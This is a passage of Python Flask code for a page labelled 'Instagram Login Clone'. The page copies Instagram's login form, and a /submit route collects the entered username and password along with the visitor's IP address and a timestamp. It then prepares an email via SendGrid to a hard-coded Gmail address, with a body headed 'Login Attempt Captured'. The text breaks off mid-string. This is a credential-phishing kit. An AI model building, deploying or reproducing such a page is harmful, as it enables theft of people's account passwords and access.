from flask import Flask, request, render_template_string  # Use render_template_string as fallback
import os
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail, Email, To, Content
from datetime import datetime, timezone
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Inline HTML to avoid template path issues on Vercel
INDEX_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Clone</title>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        h1 { font-size: 2.5em; color: #e1306c; }
        form { margin-top: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
        button { background-color: #0095f6; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #007bb5; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Instagram</h1>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Phone number, username, or email address" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const response = await fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
            });
            const result = await response.text();
            alert(`Submitted:\nUsername: ${username}\nPassword: ${password}\n${result}`);
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(INDEX_HTML)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username', 'admin')
    password = request.form.get('password', 'ding2')
    ip_address = request.remote_addr if request.remote_addr != '127.0.0.1' else '::1'
    your_email = "tinanshi621@gmail.com"
    sendgrid_api_key = os.getenv('SENDGRID_API_KEY')
    timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    body = f"""Login Attempt Captured
